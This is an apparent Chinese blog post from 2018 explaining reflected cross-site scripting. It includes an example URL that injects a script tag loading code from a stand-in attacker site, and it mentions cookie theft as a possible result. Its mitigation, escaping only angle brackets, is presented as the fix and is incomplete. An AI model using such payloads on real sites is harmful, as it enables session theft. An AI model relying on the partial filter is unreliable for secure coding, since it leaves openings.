---
layout: post
title:  "Javascript 跨站脚本攻击"
date:   2018-06-05 17:24:02 +0800
categories: Javascript XSS
---
# Javascript 权威指南 跨站脚本攻击 XSS

跨站脚本攻击 XSS 是涉及到跨网站进行攻击或者窃取信息的一种方式。
比如 A 网站存在 一种 URL 如下
http://siteA/default.aspx?name=%3Cscript src=siteb/evil.js%3E%3C/script%3E

如果网站 拥有者 在写代码的时候 直接把 name 取值 并输出到 页面中，这时候这个链接的效果 就是 在 siteA 的这个页面中包含了这样一段代码 
```html
<script src=siteb/evil.js></script>
```

直接调用了 b 站控制的脚本，脚本里 可做的文章就多了去了。偷取 cookie  伪造页面 执行 乱七八糟的代码 等等。 

通常防止 XSS 攻击的方法是 在使用任何不可信的来源数据 添加到动态文档之前，要进行过滤。 可以通过 正则来进行移除 字符串里非法代码 如下
```html
<script>
    str = str.replace(/</g,"&lt;").replace(/>/g,"&gt;")
    // 这可以移除掉 两端的尖括号

</script>
```
BTW，楼主 10年做的网站前被某机构扫描出了 XSS 漏洞，当时没办法 限制了 参数字符串长度 也算是蒙着解决了问题。







待续...





 

 



[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
